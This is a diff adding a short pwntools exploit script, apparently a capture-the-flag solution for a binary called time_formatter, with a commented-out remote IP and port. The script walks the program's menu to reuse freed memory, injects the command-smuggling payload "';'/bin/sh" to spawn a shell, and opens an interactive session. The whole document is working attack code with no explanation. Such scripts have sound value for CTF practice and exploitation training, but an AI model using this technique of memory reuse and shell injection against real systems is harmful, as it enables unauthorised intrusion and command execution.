@@ -1,0 +1,22 @@
+from pwn import *
+p = process("./time_formatter")
+#p = remote("111.198.29.45", "55779")
+#context.log_level = 'debug'
+p.recv()
+p.sendline("1")
+p.recv()
+p.sendline("%aAbBcCdDe")
+p.recv()
+p.sendline("5")
+p.recv()
+p.sendline("N")
+p.recv()
+payload = "';'/bin/sh"
+p.sendline("3")
+p.recv()
+p.sendline(payload)
+p.recv()
+p.sendline('4')
+gdb.attach(p, "b *0x400F68")
+p.recv()
+p.interactive()
